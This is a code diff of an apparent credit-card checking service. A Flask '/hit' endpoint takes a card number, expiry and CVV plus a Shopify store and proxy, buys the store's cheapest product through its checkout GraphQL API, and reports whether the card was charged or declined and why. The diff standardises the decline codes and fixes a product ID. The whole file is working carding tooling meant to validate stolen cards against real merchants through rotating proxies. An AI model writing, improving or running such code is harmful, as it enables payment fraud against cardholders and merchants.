@@ -30,7 +30,7 @@ logger = logging.getLogger(__name__)
 HTTP_TIMEOUT = 30
 MAX_RETRIES = 3
 
-# Unicode bold text mapping for better compatibility
+# --- UPGRADED BOLD MAP ---
 BOLD_MAP = {
     'CHARGED': '𝗖𝗛𝗔𝗥𝗚𝗘𝗗 💎',
     'DECLINED': '𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌',
@@ -42,6 +42,43 @@ BOLD_MAP = {
     'WARN': '⚠️ 𝗪𝗔𝗥𝗡𝗜𝗡𝗚'
 }
 
+# --- STANDARDIZED RESPONSE CODES ---
+# Maps raw errors to your specific JSON response values
+RESPONSE_MAP = {
+    # Success
+    'ORDER_CONFIRMED': 'ORDER_CONFIRMED',
+    '3DS_REQUIRED': '3DS_REQUIRED',
+    
+    # Card Declines (Bank/Gateway)
+    'insufficient_funds': 'INSUFFICIENT_FUNDS',
+    'decline': 'CARD_DECLINED',
+    'generic_decline': 'CARD_DECLINED',
+    'do_not_honor': 'DO_NOT_HONOR',
+    'pickup_card': 'PICKUP_CARD',
+    'lost_card': 'PICKUP_CARD',
+    'stolen_card': 'PICKUP_CARD',
+    'restricted_card': 'RESTRICTED_CARD',
+    'card_declined': 'CARD_DECLINED',
+    'invalid_number': 'INVALID_NUMBER',
+    'incorrect_number': 'INVALID_NUMBER',
+    'invalid_expiry': 'EXPIRED_CARD',
+    'expired_card': 'EXPIRED_CARD',
+    'invalid_cvc': 'INVALID_CVC',
+    'incorrect_cvc': 'INVALID_CVC',
+    'cvc_check_failed': 'INVALID_CVC',
+    'processing_error': 'CARD_DECLINED', # Often a generic bank error
+    'transaction_not_allowed': 'RESTRICTED_CARD',
+
+    # Site/System Issues
+    'tokenization_failed': 'TOKENIZATION_FAILED',
+    'tokenization_error': 'TOKENIZATION_FAILED',
+    'no_products': 'NO_PRODUCTS',
+    'product_fetch_failed': 'SITE_UNSUPPORTED',
+    'cart_failed': 'CART_FAILED',
+    'token_extraction_failed': 'TOKEN_EXTRACTION_FAILED',
+    'soft_error_max_retries': 'ERROR', # Fallback for system loops
+}
+
 def format_proxy(proxy_str):
     """Format proxy string to httpx compatible format"""
     if not proxy_str:
@@ -51,27 +88,22 @@ def format_proxy(proxy_str):
     if not proxy_str:
         return None
 
-    # If already a URL
     if proxy_str.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
         return proxy_str
 
     parts = proxy_str.split(':')
     
-    # IP:PORT (2 parts)
     if len(parts) == 2:
         return f"http://{proxy_str}"
     
-    # IP:PORT:USER:PASS (4 parts)
     if len(parts) == 4:
         ip, port, user, pw = parts
         return f"http://{user}:{pw}@{ip}:{port}"
     
-    # HOST:PORT:USER:PASS (4 parts with hostname)
     if len(parts) == 4 and not parts[0].replace('.', '').isdigit():
         host, port, user, pw = parts
         return f"http://{user}:{pw}@{host}:{port}"
     
-    # user:pass@host:port format
     if '@' in proxy_str:
         return f"http://{proxy_str}"
     
@@ -87,7 +119,7 @@ def find_between(s, start, end):
         return ""
 
 def mask_cc(cc_num):
-    """Mask credit card number for display (show last 4 only)"""
+    """Mask credit card number for display"""
     cc_str = str(cc_num).replace(" ", "")
     if len(cc_str) >= 4:
         return f"************{cc_str[-4:]}"
@@ -114,7 +146,6 @@ class ShopifyAuto:
     async def get_cheapest_product(self, client, site_url):
         """Find the cheapest available product"""
         try:
-            # Try products.json first
             url = f"{site_url}/products.json?limit=250"
             response = await client.get(url, headers=self.get_headers())
             
@@ -146,7 +177,6 @@ class ShopifyAuto:
                             continue
                 
                 if valid_products:
-                    # Sort by price and return cheapest
                     valid_products.sort(key=lambda x: x['price'])
                     cheapest = valid_products[0]
                     print(f"   {BOLD_MAP['FOUND']} Cheapest product: {cheapest['title']} - ${cheapest['price_str']}")
@@ -247,59 +277,52 @@ async def process_checkout_async(cc, site, proxy_str):
     """Main checkout processing function"""
     start_time = time.time()
     
+    # Initialize Default Result Structure
     result = {
-        "status": "Decline",
-        "site": "Dead",
+        "status": "ERROR",
+        "site": "UNKNOWN",
         "amount": "$0.00",
-        "response": "Unknown Error",
-        "proxy": "Dead",
+        "response": "UNKNOWN_ERROR",
+        "proxy": "NONE",
         "time": "0s",
-        "card": "Unknown"
+        "card": cc
     }
     
-    # Parse CC
+    # 1. Parse CC
     try:
         parts = cc.split('|')
         if len(parts) < 4:
-            result["response"] = "Invalid CC Format (use cc|mm|yy|cvv)"
+            result["response"] = "INVALID_FORMAT"
             result["time"] = f"{time.time() - start_time:.2f}s"
-            result["card"] = cc
             return result
         cc_num, mon, year, cvv = parts[0], parts[1], parts[2], parts[3]
         
-        # Store full card for response
-        result["card"] = cc
-        
-        # Handle 2-digit year
         if len(year) == 2:
             year = f"20{year}"
     except Exception:
-        result["response"] = "Invalid CC Format"
+        result["response"] = "INVALID_FORMAT"
         result["time"] = f"{time.time() - start_time:.2f}s"
-        result["card"] = cc
         return result
     
-    # Format site URL
+    # 2. Format Site
     if not site.startswith(('http://', 'https://')):
         site = f"https://{site}"
     site = site.rstrip('/')
     
-    # Format proxy
+    # 3. Format Proxy
     proxy_url = None
     try:
         if proxy_str:
             proxy_url = format_proxy(proxy_str)
-            result["proxy"] = "Working" if proxy_str else "None"
+            result["proxy"] = "WORKING"
         else:
-            result["proxy"] = "None"
+            result["proxy"] = "NONE"
     except ValueError as e:
-        result["response"] = str(e)
-        result["proxy"] = "Invalid Format"
+        result["response"] = "PROXY_ERROR"
+        result["proxy"] = "INVALID_FORMAT"
         result["time"] = f"{time.time() - start_time:.2f}s"
-        result["card"] = cc
         return result
     
-    # Create httpx client with proxy
     client_args = {
         'follow_redirects': True,
         'timeout': HTTP_TIMEOUT,
@@ -311,7 +334,6 @@ async def process_checkout_async(cc, site, proxy_str):
     
     shop = ShopifyAuto(proxy=proxy_url)
     
-    # Process checkout with proper retry logic
     try:
         async with httpx.AsyncClient(**client_args) as client:
             # STEP 1: Get cheapest product
@@ -319,8 +341,8 @@ async def process_checkout_async(cc, site, proxy_str):
             product = await shop.get_cheapest_product(client, site)
             
             if not product:
-                result["response"] = "No products found"
-                result["site"] = "Dead"
+                result["response"] = "NO_PRODUCTS"
+                result["site"] = "DEAD"
                 result["time"] = f"{time.time() - start_time:.2f}s"
                 return result
             
@@ -328,17 +350,15 @@ async def process_checkout_async(cc, site, proxy_str):
             price = product['price_str']
             product_handle = product.get('handle')
             
-            result["site"] = "Working"
+            result["site"] = "ACTIVE"
             result["amount"] = f"${price}"
             
             # STEP 2: Add to cart
             print(f"{BOLD_MAP['CHECK']} Adding to cart...")
             
-            # Visit product page to get cookies
             if product_handle:
                 await client.get(f"{site}/products/{product_handle}", headers=shop.get_headers())
             
-            # Add to cart
             add_data = {
                 'id': str(variant_id),
                 'quantity': '1',
@@ -352,7 +372,7 @@ async def process_checkout_async(cc, site, proxy_str):
             )
             
             if add_response.status_code != 200:
-                result["response"] = f"Failed to add to cart: {add_response.status_code}"
+                result["response"] = "CART_FAILED"
                 result["time"] = f"{time.time() - start_time:.2f}s"
                 return result
             
@@ -376,10 +396,8 @@ async def process_checkout_async(cc, site, proxy_str):
                 'upgrade-insecure-requests': '1',
             })
             
-            # Visit checkout
             await client.get(f"{site}/checkout", headers=checkout_headers)
             
-            # POST to cart to proceed
             checkout_data = {
                 'checkout': '',
                 'updates[]': '1',
@@ -393,7 +411,7 @@ async def process_checkout_async(cc, site, proxy_str):
             
             response_text = checkout_response.text
             
-            # Extract tokens from HTML
+            # Extract tokens
             session_token_match = re.search(
                 r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', 
                 response_text
@@ -405,7 +423,7 @@ async def process_checkout_async(cc, site, proxy_str):
             payment_method_id = find_between(response_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
             
             if not all([session_token, queue_token, stable_id, payment_method_id]):
-                result["response"] = "Failed to extract checkout tokens"
+                result["response"] = "TOKEN_EXTRACTION_FAILED"
                 result["time"] = f"{time.time() - start_time:.2f}s"
                 return result
             
@@ -422,19 +440,19 @@ async def process_checkout_async(cc, site, proxy_str):
             )
             
             if not card_session_id:
-                result["response"] = "Tokenization Failed"
+                result["response"] = "TOKENIZATION_FAILED"
                 result["time"] = f"{time.time() - start_time:.2f}s"
                 return result
             
-            # STEP 5: Submit GraphQL payment with proper retry logic
+            # STEP 5: Submit GraphQL payment
             print(f"{BOLD_MAP['CHECK']} Submitting payment...")
             
             graphql_url = f"{site}/checkouts/unstable/graphql"
             
-            # FIXED: Proper retry logic for soft errors
             retry_count = 0
             max_soft_retries = 3
             soft_error_retried = False
+            final_error_code = "UNKNOWN_ERROR"
             
             while retry_count < max_soft_retries:
                 retry_count += 1
@@ -450,11 +468,10 @@ async def process_checkout_async(cc, site, proxy_str):
                     'x-checkout-web-source-id': token,
                 }
                 
-                # Generate random page ID
                 page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"
                 
                 graphql_payload = {
-                    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
+                    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
                     'variables': {
                         'input': {
                             'checkpointData': None,
@@ -499,7 +516,7 @@ async def process_checkout_async(cc, site, proxy_str):
                                     'merchandise': {
                                         'productVariantReference': {
                                             'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
-                                            'variantId': f'gid://shopify/SuccessfuluctVariant/{variant_id}',
+                                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                             'properties': [],
                                             'sellingPlanId': None,
                                             'sellingPlanDigest': None,
@@ -601,44 +618,50 @@ async def process_checkout_async(cc, site, proxy_str):
                 
                 if graphql_response.status_code == 200:
                     result_data = graphql_response.json()
-                    
-                    # Check for errors
                     completion = result_data.get('data', {}).get('submitForCompletion', {})
                     
-                    # Extract receipt ID if present
                     receipt_id = None
                     if completion.get('receipt'):
                         receipt_id = completion['receipt'].get('id')
                     
-                    # Check for errors
                     errors = completion.get('errors', [])
                     if errors:
-                        error_codes = [e.get('code') for e in errors if 'code' in e]
+                        error_codes = [e.get('code', '').lower() for e in errors if 'code' in e]
                         
-                        # FIXED: Soft errors we can retry - now properly handles all 3 attempts
-                        soft_errors = ['TAX_NEW_TAX_MUST_BE_ACCEPTED', 'WAITING_PENDING_TERMS']
-                        only_soft = all(code in soft_errors for code in error_codes)
+                        # Logic to map raw error codes to standardized RESPONSE_MAP
+                        mapped_response = None
+                        for code in error_codes:
+                            if code in RESPONSE_MAP:
+                                mapped_response = RESPONSE_MAP[code]
+                                break
                         
-                        if only_soft and retry_count < max_soft_retries:
+                        # Soft errors
+                        soft_errors = ['tax_new_tax_must_be_accepted', 'waiting_pending_terms']
+                        is_soft = any(err in soft_errors for err in error_codes)
+
+                        if is_soft and retry_count < max_soft_retries:
                             print(f"   {BOLD_MAP['WARN']} Soft errors detected: {', '.join(error_codes)}")
                             print(f"   {BOLD_MAP['CHECK']} Retrying ({retry_count}/{max_soft_retries})...")
                             soft_error_retried = True
-                            await asyncio.sleep(2)  # Wait before retry
-                            continue  # Go to next retry attempt
+                            final_error_code = mapped_response if mapped_response else "ERROR"
+                            await asyncio.sleep(2)
+                            continue
                         else:
-                            result["response"] = f"{', '.join(error_codes)}"
+                            # Hard decline or final retry attempt
+                            result["response"] = mapped_response if mapped_response else "CARD_DECLINED"
                             result["status"] = BOLD_MAP['DECLINED']
                             result["time"] = f"{time.time() - start_time:.2f}s"
                             return result
                     
-                    # Check for explicit failure
                     if completion.get('reason'):
-                        result["response"] = f"Failed: {completion['reason']}"
+                        # Handle general failure reasons
+                        reason = completion.get('reason', '').lower()
+                        mapped = RESPONSE_MAP.get(reason, "CARD_DECLINED")
+                        result["response"] = mapped
                         result["status"] = BOLD_MAP['DECLINED']
                         result["time"] = f"{time.time() - start_time:.2f}s"
                         return result
                     
-                    # If we got a receipt ID, poll for result
                     if receipt_id:
                         print("  Polling for receipt status...")
                         
@@ -667,62 +690,60 @@ async def process_checkout_async(cc, site, proxy_str):
                                     return result
                                 elif typename == 'ActionRequiredReceipt':
                                     result["status"] = BOLD_MAP['APPROVED']
-                                    result["response"] = "OTP_REQUIRED"
+                                    result["response"] = "3DS_REQUIRED"
                                     result["time"] = f"{time.time() - start_time:.2f}s"
                                     return result
                                 elif typename == 'FailedReceipt':
                                     error = receipt.get('processingError', {})
-                                    code = error.get('code', 'Unknown')
-                                    result["response"] = f"{code}"
+                                    code = error.get('code', 'unknown').lower()
+                                    
+                                    # Map poll error
+                                    mapped_response = RESPONSE_MAP.get(code, "CARD_DECLINED")
+                                    result["response"] = mapped_response
                                     result["status"] = BOLD_MAP['DECLINED']
                                     result["time"] = f"{time.time() - start_time:.2f}s"
                                     return result
                         
-                        result["response"] = "Polling timeout"
+                        result["response"] = "TIMEOUT"
                         result["status"] = BOLD_MAP['ERROR']
                         result["time"] = f"{time.time() - start_time:.2f}s"
                         return result
                     
-                    # If we got here with no errors but no receipt, assume success
                     result["status"] = BOLD_MAP['SUCCESS']
-                    result["response"] = "Payment processed"
+                    result["response"] = "ORDER_CONFIRMED"
                     result["time"] = f"{time.time() - start_time:.2f}s"
                     return result
                     
                 else:
-                    result["response"] = f"GraphQL HTTP {graphql_response.status_code}"
+                    result["response"] = "SITE_BLOCKED"
                     result["status"] = BOLD_MAP['ERROR']
                     result["time"] = f"{time.time() - start_time:.2f}s"
                     return result
             
-            # If we exhausted retries
             if soft_error_retried:
-                result["response"] = "Max soft error retries exceeded"
+                result["response"] = final_error_code
             else:
-                result["response"] = "Max retries exceeded"
+                result["response"] = "MAX_RETRIES_EXCEEDED"
             result["status"] = BOLD_MAP['ERROR']
             result["time"] = f"{time.time() - start_time:.2f}s"
             return result
             
     except httpx.ProxyError:
-        result["proxy"] = "Proxy Error"
-        result["response"] = "Proxy connection failed"
+        result["proxy"] = "PROXY_ERROR"
+        result["response"] = "PROXY_ERROR"
         result["status"] = BOLD_MAP['ERROR']
         result["time"] = f"{time.time() - start_time:.2f}s"
-        result["card"] = cc
         return result
     except httpx.ConnectTimeout:
-        result["proxy"] = "Proxy Timeout" if proxy_str else "Dead"
-        result["response"] = "Connection Timeout"
+        result["proxy"] = "PROXY_TIMEOUT" if proxy_str else "DEAD"
+        result["response"] = "TIMEOUT"
         result["status"] = BOLD_MAP['ERROR']
         result["time"] = f"{time.time() - start_time:.2f}s"
-        result["card"] = cc
         return result
     except Exception as e:
-        result["response"] = f"Error: {str(e)}"
+        result["response"] = "CONNECTION_ERROR"
         result["status"] = BOLD_MAP['ERROR']
         result["time"] = f"{time.time() - start_time:.2f}s"
-        result["card"] = cc
         return result
 
 @app.route('/hit', methods=['GET'])
@@ -737,22 +758,22 @@ def process_api():
         # API key validation
         if not key or key != "nano":
             return jsonify({
-                "status": "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌",
-                "site": "Unknown",
+                "status": "DECLINED",
+                "site": "UNKNOWN",
                 "amount": "$0.00",
-                "response": "Invalid Key",
-                "proxy": "Unknown",
+                "response": "INVALID_KEY",
+                "proxy": "UNKNOWN",
                 "time": "0s",
                 "card": cc if cc else "Unknown"
             })
         
         if not cc or not site:
             return jsonify({
-                "status": "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌",
-                "site": "Unknown",
+                "status": "DECLINED",
+                "site": "UNKNOWN",
                 "amount": "$0.00",
-                "response": "Missing CC or Site",
-                "proxy": "Unknown",
+                "response": "MISSING_PARAMS",
+                "proxy": "UNKNOWN",
                 "time": "0s",
                 "card": cc if cc else "Unknown"
             })
@@ -767,11 +788,11 @@ def process_api():
         
     except Exception as e:
         return jsonify({
-            "status": "Error",
-            "proxy": "Error",
-            "site": "Error",
-            "amount": "Error",
-            "response": str(e),
+            "status": "ERROR",
+            "proxy": "ERROR",
+            "site": "UNKNOWN",
+            "amount": "$0.00",
+            "response": "SYSTEM_ERROR",
             "time": "0s",
             "card": "Unknown"
         })
@@ -781,5 +802,4 @@ def health_check():
     return jsonify({"status": "running"})
 
 if __name__ == "__main__":
-
-    app.run(host='0.0.0.0', port=5001, debug=False)
+    app.run(host='0.0.0.0', port=5000, debug=False)
